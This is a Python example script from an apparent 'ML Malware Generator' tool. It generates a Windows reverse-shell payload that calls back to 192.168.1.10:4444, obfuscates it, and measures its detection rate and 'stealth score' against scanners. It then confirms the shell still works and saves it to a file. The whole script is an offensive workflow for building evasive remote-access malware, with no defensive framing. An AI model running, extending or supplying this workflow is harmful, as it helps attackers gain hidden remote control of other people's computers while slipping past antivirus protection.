"""
Example: Generate and evaluate a payload
"""
from ml_engine import get_ml_engine
from generators.payload_factory import get_payload_factory
from obfuscation.obfuscator import get_obfuscator
from testing.detector import get_detector, get_functionality_tester, MetricsCalculator
from utils.logger import get_logger
import time

logger = get_logger()


def main():
    """Example workflow"""
    
    logger.info("=== ML Malware Generator Example ===")
    
    # 1. Generate payload
    logger.info("\n[1] Generating reverse shell payload...")
    factory = get_payload_factory()
    
    payload, metadata = factory.generate_reverse_shell_tcp(
        lhost="192.168.1.10",
        lport=4444,
        target_os="windows",
        architecture="x64",
    )
    
    logger.success(f"Generated payload: {len(payload)} bytes")
    
    # 2. Apply obfuscation
    logger.info("\n[2] Applying obfuscation...")
    obfuscator = get_obfuscator()
    
    obfuscated, obf_metadata = obfuscator.obfuscate_payload(
        payload,
        level=3,
    )
    
    logger.success(f"Obfuscated payload: {len(obfuscated)} bytes")
    logger.info(f"Techniques applied: {', '.join(obf_metadata['techniques_applied'])}")
    
    # 3. Evaluate payload
    logger.info("\n[3] Evaluating payload...")
    detector = get_detector()
    
    start_time = time.time()
    detection_results = detector.analyze_payload(
        obfuscated,
        use_virustotal=False,
        use_local=True,
    )
    
    # 4. Test functionality
    logger.info("\n[4] Testing functionality...")
    tester = get_functionality_tester()
    
    functionality_results = tester.test_payload_functionality(
        obfuscated,
        payload_type="reverse_shell_tcp",
    )
    
    # 5. Calculate metrics
    generation_time = time.time() - start_time
    metrics = MetricsCalculator.calculate_metrics(
        detection_results,
        functionality_results,
        generation_time,
    )
    
    # 6. Display results
    logger.info("\n=== RESULTS ===")
    logger.info(f"Detection Rate: {metrics['detection_rate']:.1%}")
    logger.info(f"Stealth Score: {metrics['stealth_score']:.1%}")
    logger.info(f"Functionality: {metrics['functionality_score']:.1%}")
    logger.info(f"Overall Score: {metrics['overall_score']:.1%}")
    logger.info(f"Success: {'✓' if metrics['success'] else '✗'}")
    
    # 7. Save payload
    logger.info("\n[5] Saving payload...")
    output_path = factory.save_payload(
        obfuscated,
        "example_payload.bin",
        metadata={**metadata, **obf_metadata},
    )
    
    logger.success(f"Payload saved to: {output_path}")
    logger.info("\n=== Example Complete ===")


if __name__ == "__main__":
    main()
